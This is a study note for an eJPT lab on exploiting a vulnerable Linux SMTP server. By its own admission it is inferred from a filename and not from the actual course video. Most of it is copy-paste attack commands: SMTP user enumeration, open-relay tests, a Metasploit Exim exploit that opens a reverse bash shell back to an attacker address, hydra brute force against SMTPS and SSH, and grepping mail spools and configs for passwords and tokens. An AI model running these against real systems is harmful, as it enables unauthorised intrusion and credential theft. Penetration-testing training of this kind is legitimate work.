# 10 - Exploiting A Vulnerable SMTP Server (eJPT)

Note: No transcript was provided. The following is a conservative, eJPT-style summary inferred from the filename and module context (02-LinuxExploitation). Commands and flows reflect common lab approaches to exploiting a vulnerable SMTP service on Linux (e.g., Exim).

## What the video covers (Introduction / big picture)
- How to enumerate and exploit a vulnerable SMTP server running on Linux.
- Identifying SMTP software/version and enabled features (VRFY, EXPN, AUTH, STARTTLS).
- Using Nmap NSE and manual SMTP to detect misconfigurations (open relay, user enumeration).
- Checking for known SMTP server RCEs (commonly Exim vulnerabilities) and exploiting via Metasploit.
- Alternate paths: credential discovery via user enumeration + bruteforce; using mail spools for secrets post-compromise.

## Flow (ordered)
1. Port scan and service detection for SMTP (25/465/587).
2. SMTP banner and command enumeration (EHLO, VRFY, EXPN).
3. Run Nmap NSE scripts for features, relay, user enum, and known vulns.
4. If Exim is detected, probe for known CVEs; try Metasploit exploit for Exim RCE if applicable.
5. If no RCE: test for open relay; attempt VRFY-based user enum; check if SMTP AUTH is offered.
6. If AUTH present, attempt targeted bruteforce; or use discovered users to attack other services (e.g., SSH).
7. On shell: enumerate system and loot mail/config files for credentials.
8. Clean up and document findings.

## Tools highlighted
- nmap (+ NSE: smtp-commands, smtp-open-relay, smtp-enum-users, smtp-vuln-cve2010-4344, smtp-vuln-cve2011-1764)
- nc or telnet (manual SMTP), openssl s_client (STARTTLS)
- swaks (SMTP testing, AUTH, relay checks)
- Metasploit Framework (auxiliary SMTP scanners; exploit/unix/smtp/exim4_string_format)
- searchsploit (lookup public exploits)
- hydra (optional brute-force if SMTP AUTH is enabled; otherwise SSH)
- nc (listener) for reverse shells

## Typical command walkthrough (detailed, copy-paste friendly)

Replace TARGET with the target IP or host. Replace ATTACKER with your IP.

1) Initial scan and service/version detection
```
mkdir -p scans
nmap -Pn -p25,465,587 -sV -sC -oN scans/smtp_initial.txt TARGET
```

2) SMTP feature and misconfiguration enumeration
```
# NSE for commands, user enum, open relay
nmap -Pn -p25 --script "smtp-commands,smtp-open-relay,smtp-enum-users" -oN scans/smtp_nse_features.txt TARGET

# Probe known Exim vulns (only if present)
nmap -Pn -p25 --script "smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1764" -oN scans/smtp_nse_vulns.txt TARGET
```

3) Manual banner and command checks (cleartext)
```
# Quick banner grab
nc -nv TARGET 25

# Scripted EHLO/VRFY/EXPN test
cat << 'EOF' | nc -nv TARGET 25
EHLO attacker.local
VRFY root
VRFY www-data
EXPN root
QUIT
EOF
```

4) STARTTLS (if offered) with openssl
```
# STARTTLS handshake; -crlf ensures proper line endings
openssl s_client -starttls smtp -connect TARGET:25 -crlf
# After the TLS session is established, type:
# EHLO attacker.local
# AUTH LOGIN
# (send base64 user, then base64 pass)
```

5) swaks for SMTP testing (relay and AUTH)
```
# Open relay test (should fail on a secure server)
swaks --server TARGET --port 25 --from you@attacker.tld --to someone@external.tld --timeout 10

# Local delivery test (typically allowed)
swaks --server TARGET --port 25 --from probe@attacker.tld --to root@localhost --timeout 10

# AUTH detection and test (with STARTTLS)
swaks --server TARGET --port 25 --ehlo attacker --tls-starttls --timeout 10

# If AUTH LOGIN/PLAIN is offered and you have a guess:
swaks --server TARGET --port 25 --ehlo attacker --tls-starttls --auth LOGIN --auth-user user --auth-password 'password'
```

6) Metasploit auxiliary SMTP enumeration
```
msfconsole -q -x "use auxiliary/scanner/smtp/smtp_enum; set RHOSTS TARGET; set THREADS 10; run; exit"

msfconsole -q -x "use auxiliary/scanner/smtp/smtp_ntlm_info; set RHOSTS TARGET; run; exit"  # Useful for Exchange/NTLM
```

7) Check for Exim RCE (common in labs) and exploit
```
# Identify Exim in banners or with nmap -sV, then:
searchsploit exim

# Metasploit Exim string format exploit (CVE-2010-4344/2011-1764 chain)
msfconsole
use exploit/unix/smtp/exim4_string_format
set RHOSTS TARGET
set RPORT 25
set LHOST ATTACKER
set LPORT 4444
set PAYLOAD cmd/unix/reverse_bash
run
```

8) Prepare a listener (if using reverse shell payload manually or via other exploit)
```
nc -lvnp 4444
```

9) If SMTP AUTH allows bruteforce (less common on port 25; often on 587 or 465)
```
# Only if AUTH is offered. For implicit TLS on 465:
nmap -Pn -p465 -sV TARGET

# Bruteforce smtps (465)
hydra -V -f -l user -P /usr/share/wordlists/rockyou.txt -s 465 TARGET smtps

# If AUTH is on 587 (STARTTLS), prefer swaks for validation; for brute-force, consider focusing on SSH instead with enumerated users:
hydra -V -f -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://TARGET
```

10) Post-exploitation looting (after shell)
```
whoami; id; hostname; uname -a
# Look for mail and creds
ls -l /var/mail/ || ls -l /var/spool/mail/
grep -RniE 'passw|secret|api|token' /var/mail/ 2>/dev/null
# Common configs where SMTP creds may live
grep -RniE 'sasl|auth|password' /etc/postfix/ /etc/exim/ /etc/exim4/ 2>/dev/null
# System users discovered via VRFY can help pivot to SSH
cat /etc/passwd | cut -d: -f1
```

## Practical tips
- Always run EHLO first; it reveals extensions (AUTH, STARTTLS, PIPELINING, etc.).
- Use proper CRLF line endings when speaking SMTP manually. With openssl s_client, -crlf helps; with nc, prefer printf with \r\n.
- VRFY/EXPN may be disabled; fall back to NSE scripts and wordlists for RCPT TO-based enumeration.
- If you see Exim with a vulnerable version (e.g., older 4.6x–4.7x), check for the known string format RCE chain; Metasploit often lands a quick shell.
- Open relay is often disabled; if enabled, document thoroughly. It’s usually not direct code execution, but it is a high-impact misconfiguration.
- If SMTP AUTH is not offered on 25, check 587 (submission) and 465 (smtps).
- Prefer targeted bruteforce with known usernames (from VRFY or from other services) to reduce noise.
- After compromise, mail spools and MTA configs can contain passwords, API keys, and internal paths.

## Minimal cheat sheet (one-screen flow)
```
# Scan
nmap -Pn -p25,465,587 -sV -sC TARGET -oN smtp_initial.txt
nmap -Pn -p25 --script "smtp-commands,smtp-open-relay,smtp-enum-users,smtp-vuln-cve2010-4344" TARGET -oN smtp_nse.txt

# Manual enum
cat << 'EOF' | nc -nv TARGET 25
EHLO attacker.local
VRFY root
EXPN root
QUIT
EOF

# STARTTLS
openssl s_client -starttls smtp -connect TARGET:25 -crlf

# swaks checks
swaks --server TARGET --port 25 --from you@attacker.tld --to someone@external.tld     # open relay test
swaks --server TARGET --port 25 --ehlo attacker --tls-starttls                        # list extensions
swaks --server TARGET --port 25 --tls-starttls --auth LOGIN -au user -ap 'pass'       # AUTH test

# Metasploit Exim exploit (if version vulnerable)
msfconsole -q -x "use exploit/unix/smtp/exim4_string_format; set RHOSTS TARGET; set RPORT 25; set LHOST ATTACKER; set LPORT 4444; set PAYLOAD cmd/unix/reverse_bash; run"

# Listener (if needed)
nc -lvnp 4444

# Post-ex
ls -l /var/mail/; grep -RniE 'pass|key|token' /var/mail/ 2>/dev/null
```

## Summary
- The lab demonstrates enumerating and exploiting a Linux SMTP service. Start with Nmap to identify the server and features, then use manual SMTP (EHLO/VRFY/EXPN), NSE scripts, and swaks to validate capabilities like STARTTLS and AUTH. If Exim is detected and the version is known-vulnerable, use the Metasploit exim4_string_format exploit to gain code execution. If RCE isn’t available, leverage user enumeration to attack other services (e.g., SSH), or test SMTP AUTH where applicable. After compromise, loot mail spools and MTA configs for credentials and sensitive data.